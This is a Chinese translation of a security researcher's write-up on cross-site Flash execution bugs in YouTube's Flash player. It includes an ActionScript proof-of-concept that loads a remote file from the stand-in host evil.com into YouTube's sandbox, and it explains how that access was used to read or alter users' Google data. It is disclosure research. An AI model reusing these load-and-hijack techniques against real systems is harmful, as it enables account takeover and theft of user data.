<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>看我如何将flash漏洞死灰复燃（2&amp;3部分）</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/29469971">原文</a></p>
<div class="title-image"><img src="https://pic2.zhimg.com/v2-c14ebfdcfe0b340d07d57a75344431e6_r.jpg" alt=""></div><h2>2 通过 appLoader 进行 XSF</h2><p>我在前一章节中介绍了 youtube 的一个信息泄露漏洞。在这一章节里，我将介绍一个任意Flash 代码执行漏洞。这一类漏洞十分像 XSS，只不过我们通常称呼其为跨站点 Flash 执行(XSF) 或者 Flash SOP 绕过。这一章节理解起来可能比较困难，我强烈建议读者到<a href="http://www.senocular.com/flash/tutorials/contentdomains/">[这里]</a>预习背景知识。</p><p>让我们先来看看 Youtube 的 Flash API 及其安全沙箱：</p><img src="https://pic2.zhimg.com/v2-c14ebfdcfe0b340d07d57a75344431e6_r.png" data-rawwidth="1232" data-rawheight="328"><p>Loader（加载文件）对象能通过以下两种方式加载外部 Flash 文件：</p><ul><li>通过正常的 Loader.load() 方式加载（类似 `iframe`，即两个 Flash 都有独立的安全沙箱）</li><li>如果 loader 使用了参数 `SecurityDomain.currentDomain`，那么被加载的 flash 文件就会和loader 在同一沙箱内执行（可以比作`&lt;script src=""&gt;`）</li></ul><p>&gt; 注意，虽然图中的主程序和其加载的模块都属于同一个域名，但参数`SecurityDomain.currentDomain` 才是它们在同一个沙箱的原因</p><p>在第一章中，我们已经能通过 `youtubeWrapper.getChildAt(0)` 获得 Youtube appLoader 的属性了。这一次，我们可以用 `appLoader.load(“evil.com/evil2.swf”,<br>SecurityDomain.currentDomain)` 让 appLoader 加载任意外部文件到主文件的沙箱中。</p><p>这是大致流程：</p><img src="https://pic4.zhimg.com/v2-f35ed5b6664589f6d52e045e8e5ea950_r.png" data-rawwidth="1609" data-rawheight="596"><p>PoC：</p><code lang="js">var loader = new Loader();
// 加载 Youtube Wrapper (1)
loader.load(new
URLRequest("https://www.youtube.com/v/[VIDEO_ID]"));
var youtubeWrapper = loader.content;
// 获得 Youtube Wrapper的appLoader对象
(3)
var appLoader = youtubeWrapper.getChildAt(0);
// 加载 evil2.swf 到 youtubeWrapper security sandbox. (4)
appLoader.load(new
URLRequest("http://evil.com/evil2.swf"), new LoaderContext(false,
ApplicationDomain.currentDomain, SecurityDomain.currentDomain));
// 现在可以任意代码执行了！ (5)</code><h2> 一些技术细节：</h2><p>根据 flash 的官方文档，SecurityDomain.currentDomain 表示的是当前被写入沙箱的地址。事实上，它的变化远比官方描述的要复杂。</p><p>appLoader 确实是由 Youtube Wrapper 初始化的，但 appLoader 的`appLoader.load(evil.com/evil2.swf,SecurityDomain.currentDomain )` 却被算为 evil.swf 的调用。如果你对 flash 进行 debug，你会发现 evil2.swf 先被加载到 evil.swf 的沙箱。当 Youtube Wrapper 初始化完 appLoader 后，evil2.swf 又会返回到 Youtube 沙箱中执行。</p><p>加载完后，Flash Player 允许它发送请求到 `https://www.youtube.com/` 域名下的任意路径并用 `URLLoader` 读取任意响应</p><p>&gt; URLLoader 相当于 JavaScript 的 XHR</p><h2>3 通过 loaderinfo.url 进行 XSF</h2><p>让我们来看看主程序是如何加载模块的：</p><img src="https://pic3.zhimg.com/v2-778139ea1cbee5edbb51342d73c60d90_r.png" data-rawwidth="1337" data-rawheight="320"><p>通过插入自己的 URL(2) 以及替换文件名（更改 `watch_as3.swf` 为 `subtitles.swf`)，主程序可以动态生成模块的 URL 并处理多个版本。与此同时，主程序使用 `loaderInfo.url` 获得自己的url。</p><p>&gt; appLoader 可以比作 html 的 iframe，它的 appLoader.loaderInfo.url 属性类似于 iframe 的src。不同的是 flash 可以同时加载多个 swf 文件，而 iframe 只能加载一个 url</p><p>但 loaderInfo.url 十分奇特，如果 appLoader 加载完主程序后直接载入其他 Flash 文件，主程序的 loaderInfo.url 会变成最新加载的 flash 的 url（而不是主程序的 url）。当主程序需要 url获取其它模块时，攻击者便有利可图。</p><p>POC 工作流程:</p><img src="https://pic1.zhimg.com/v2-57c4a086ef0fe61c2d46007523b844c7_r.png" data-rawwidth="1540" data-rawheight="591"><p>如图所示，我们先移除 Youtube Wrapper，再用 Evil Wrapper 代替它。Evil Wrapper 会先加载主程序（1），然后再加载另一个文件 Noop.swf（2）。当主程序尝试加载模块时，它将获取appLoader url 的值（3）(此时 loaderInfo.url 是 evil.com/Noop.swf，而主程序期盼的是s.ytime.com/watch_as3.swf) 并以该 domain 为基础更改模块地址(最终结果为evil.com/subtitles.swf)，最后导致任意 Flash 代码执行（4）</p><p>此时的 Evil Module 则被映射到 s.ytimg.com/[[IMPORT]]/evil.com/subtitles.swf。由于`s.ytimg.com` 处于沙箱中，我们不能用代码去获取 `https://s.ytimg.com/` 的 cookie，CSRF<br>token。</p><p>不过在第二章中，我介绍了和 XHR 类似的 URLLoader。如果一个服务器上的crossdomain.xml 允许 `s.ytimg.com`，那么我们可以对该服务器发起跨域请求。</p><p>&gt; crossdomain.xml 的和 CORS 头的作用类似</p><p>所幸的是，谷歌的绝大部分域名都允许来自 `https://s.ytime.com/` 的跨域请求。因此我们可以直接通过跨域得到/篡改用户的敏感信息（比如读取 google doc 的文档，以被攻击者的身份在youtube 上传视频）。</p><p><br></p><p><br></p><p><br></p><p><b><i>作者：Enguerran Gillier——</i></b><a href="https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/">https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-2/</a></p><p><a href="https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/">https://opnsec.com/2017/08/advanced-flash-vulnerabilities-in-youtube-part-3/</a></p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
